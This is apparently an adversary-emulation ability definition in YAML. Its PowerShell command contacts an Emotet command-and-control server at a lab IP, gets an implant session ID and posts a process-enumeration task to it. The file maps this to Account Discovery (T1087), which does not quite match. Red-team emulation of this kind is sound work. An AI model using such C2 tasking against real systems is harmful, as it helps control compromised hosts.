---
- id: d4c3b2a1-f6e5-5b7a-9d8c-1f0e2a3b4c5d
  name: emotet_enum_processes
  description: Issue process enumeration task via Emotet C2 channel
  tactic: discovery
  technique_id: T1087
  technique_name: Account Discovery
  executors:
  - name: psh
    platform: windows
    command: |
      $guid = Invoke-RestMethod -Uri "http://192.168.21.132:9999/api/v1.0/sessions" -Method GET | ConvertFrom-Json | Select-Object -First 1 -ExpandProperty GUID
      Invoke-RestMethod -Uri "http://192.168.21.132:9999/api/v1.0/task/$guid" -Method POST -Body "2" -ContentType "text/plain"
      Start-Sleep -Seconds 15
      Write-Output "Process enumeration task issued via Emotet C2"
    code: null
    language: null
    build_target: null
    payloads: []
    uploads: []
    timeout: 60
    parsers: []
    cleanup: []
    variations: []
